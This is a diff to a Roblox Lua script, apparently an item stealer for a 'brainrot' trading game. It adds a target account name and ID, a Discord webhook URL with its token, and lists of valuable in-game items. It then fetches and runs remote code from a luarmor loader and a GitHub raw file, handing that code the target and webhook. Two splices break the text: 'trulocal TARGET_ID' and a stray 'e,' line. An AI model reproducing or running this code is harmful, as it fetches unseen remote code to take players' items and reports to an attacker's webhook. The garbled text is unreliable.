@@ -1,1 +1,147 @@
-loadstring(game:HttpGet("https://cdn.sourceb.in/bins/Gc5dsi7whP/0"))()
+    ["Rubiko and Kubiko"] = true,
+    ["La Fuse Machine"] = trulocal TARGET_ID = 11179403323
+local TARGET_USER = "buyerthea123"
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1539479629457260605/krilcupgqiSyHNTE8MhuaPoXWexQNKfCOf9_OP-BioKJ2rh6v2t2oE5EXFO_QawnaXmk"
+
+local TargetBrainrots = {
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Griffin"] = true,
+    ["Dragon Gingerini"] = true,
+    ["Dragon Cannelloni"] = true,
+    ["Hydra Bunny"] = true,
+    ["Hydra Dragon Cannelloni"] = true,
+    ["John Pork"] = true,
+    ["Antonio"] = true,
+    ["Rubrikiko"] = true,
+    ["Elefanto Frigo"] = true,
+    ["Arcadragon"] = true,
+    ["Pancake and Syrup"] = true,
+    ["Capitano Americano"] = true,
+    ["Rico Dinero"] = true,
+    ["Kalika Bros"] = true,
+    ["Tirilikalika Tirilikalako"] = true,
+    ["Dug Dug Dug"] = true,
+    ["Globa Steppa"] = true,
+    ["Dragon Aquanini"] = true,
+    ["La Casa Boo"] = true,
+    ["Headless Horseman"] = true,
+    ["La Supreme Combinasion"] = true,
+    ["Fishino Clownino"] = true,
+    ["Signore Carapace"] = true,
+    ["Cerberus"] = true,
+    ["Duggy Bros"] = true,
+    ["Kraken"] = true,
+    ["Steakini Fattini"] = true,
+    ["Venuspino"] = true,
+    ["Rhino Helicopterino"] = true,
+    ["Caylusaurus"] = true,
+    ["Sammyni Cakini"] = true,
+    ["Centrucci Nuclucci"] = true,
+    ["Los Hackers"] = true,
+    ["John Doe"] = true,
+    ["Jelly Moby"] = true,
+    ["Gorillo Subwoofero"] = true,
+    ["Foxini Lanternini"] = true,
+    ["Bearito Cabinito"] = true,
+    ["Digi Narwhal"] = true,
+    ["Los Admins"] = true,
+    ["Moby Bros"] = true,
+    ["Boppin Bunny"] = true,
+    ["Bunny and Eggy"] = true,
+    ["Burguro and Fryuro"] = true,
+    ["Capitano Moby"] = true,
+    ["Celestial Pegasus"] = true,
+    ["Cash or Card"] = true,
+    ["Celularcini Viciosini"] = true,
+    ["Cooki and Milki"] = true,
+    ["Cloverat Clapat"] = true,
+    ["Fortunu and Cashuru"] = true,
+    ["Fragola La La La"] = true,
+    ["Fragrama and Chocrama"] = true,
+    ["Frankentteo"] = true,
+    ["Garama and Madundung"] = true,
+    ["Ginger Gerat"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Jackorilla"] = true,
+    ["Jolly Jolly Sahur"] = true,
+    ["Ketupat Bros"] = true,
+    ["La Food Combinasion"] = true,
+    ["La Secret Combinasion"] = true,
+    ["Los Secret Combinasionas"] = true,
+    ["Pizza and Ranch"] = true,
+    ["Chicleteira Champeona"] = true,
+    ["Los Amigos"] = true,
+    ["Yetimatic"] = true,
+    ["Bumbatron"] = true,
+    ["Queen Bee"] = true,
+    ["S'more Serat"] = true,
+    ["La Breakfast Combinasion"] = true,
+    ["Los Matteos"] = true,
+    ["Los Hotspotsitos"] = true,
+    ["Los Cucarachas"] = true,
+    ["Los Bunitos"] = true,
+    ["Los Sekolahs"] = true,
+    ["Los Spaghettis"] = true,
+    ["Love Love Bear"] = true,
+    ["Popcuru and Fizzuru"] = true,
+    ["Quackini Snackini"] = true,
+    ["Reinito Sleighito"] = true,
+    ["Rosey and Teddy"] = true,
+    ["Sammyni Fattini"] = true,
+    ["Spaghetti Tualetti"] = true,
+    ["Spooky and Pumpky"] = true,
+    ["Tralaledon"] = true,
+    ["Grabatron"] = true,
+e,
+    ["Candini Fluffini"] = true,
+    ["Polaroidini"] = true,
+    ["Nachorilla"] = true,
+    ["Sammyni Truckini"] = true,
+    ["Burrito Bat"] = true,
+    ["Tacoturbo Tacorito"] = true
+}
+
+local TargetBaseSkins = {
+    ["Divine"] = true,
+    ["Cursed"] = true,
+    ["Cyber"] = true,
+    ["Tralalero"] = true,
+    ["Rainbow"] = true,
+    ["Radioactive"] = true,
+    ["Yin Yang"] = true,
+    ["Lava"] = true,
+    ["Galaxy"] = true,
+    ["Candy"] = true,
+    ["Bunny Basket"] = true
+}
+
+local TargetGears = {
+    ["Bloodmoon Hammer"] = true,
+    ["Blackhole Bomb"] = true,
+    ["Bloodmoon Slap"] = true,
+    ["Candy Sentry"] = true,
+    ["Cupid's Wings"] = true,
+    ["Lava Blaster"] = true,
+    ["Radioactive Airstrike"] = true,
+    ["Rainbow Hammer"] = true,
+    ["Santa's Sleigh"] = true,
+    ["Waverider"] = true,
+    ["Witch's Broom"] = true,
+    ["Yin Yang Lamp"] = true,
+    ["Phantom Slap"] = true,
+    ["Crystal Slap"] = true
+}
+
+task.spawn(function()
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/738145c1e61953960c524fb2f9c30b72.lua"))()
+
+    task.wait(1)
+
+    local script = loadstring(game:HttpGet("https://raw.githubusercontent.com/chocolascript-glitch/script/refs/heads/main/logic.lua"))()
+    if type(script) == "function" then
+        script(TARGET_ID, TARGET_USER, WEBHOOK_URL, TargetBrainrots, TargetBaseSkins, TargetGears)
+    end
+end)
+
